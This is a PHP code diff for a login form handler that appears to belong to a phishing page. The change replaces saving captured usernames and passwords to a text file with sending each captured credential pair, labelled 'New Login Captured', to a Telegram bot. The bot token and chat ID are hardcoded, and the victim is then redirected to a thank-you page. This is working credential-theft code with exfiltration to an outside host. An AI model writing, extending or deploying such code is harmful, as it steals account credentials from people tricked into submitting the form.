@@ -3,13 +3,31 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['password']);
 
-    $data = "Username: $username | Password: $password\n";
+    // Format the message
+    $message = "🔐 *New Login Captured*\n👤 Username: `$username`\n🔑 Password: `$password`";
 
-    // Save to a text file
-    file_put_contents("logins.txt", $data, FILE_APPEND | LOCK_EX) or die("❌ Could not write to logins.txt");
+    // Telegram Bot API Details
+    $botToken = "7873119742:AAGPbwrxfIzspn7QTqWbBFbQFUM-uu_XsU8";
+    $chatID = "6103934030";
 
+    // Send message to Telegram
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
 
-    // Redirect to thank you page
+    $postData = [
+        'chat_id' => $chatID,
+        'text' => $message,
+        'parse_mode' => 'Markdown'
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+
+    // Redirect after sending
     header("Location: thankyou.html");
     exit();
 }
